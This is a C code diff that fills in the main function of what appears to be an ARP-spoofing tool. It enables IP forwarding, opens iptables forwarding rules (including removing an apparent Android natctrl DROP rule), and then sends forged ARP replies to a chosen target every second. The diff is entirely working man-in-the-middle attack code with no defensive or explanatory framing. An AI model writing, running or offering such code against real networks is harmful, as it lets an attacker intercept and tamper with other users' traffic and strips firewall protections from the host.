@@ -50,6 +50,26 @@ void str_to_mac(unsigned char mac[ETH_ALEN],const char *str){
     free(copy);
 }
 
-int main(){
-    return 0;
+int main(int argc, char **argv){
+    char *my_interface = "wlan0"; // interface name
+
+    unsigned long dest_ip=inet_addr(argv[1]);
+    unsigned long src_ip=inet_addr(argv[3]);
+
+    unsigned char dest_mac[ETH_ALEN];
+    unsigned char src_mac[ETH_ALEN];
+
+    str_to_mac(dest_mac, argv[2]);
+    str_to_mac(src_mac, argv[4]);
+
+    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
+    system("iptables -A FORWARD -j ACCEPT");
+
+    system("iptables -D natctrl_FORWARD -j DROP");
+    system("iptables -A natctrl_FORWARD -j ACCEPT");
+
+    while(1){
+        arp_reply_send(my_interface, src_ip, src_mac, dest_ip, dest_mac);
+        sleep(1);
+    }
 }
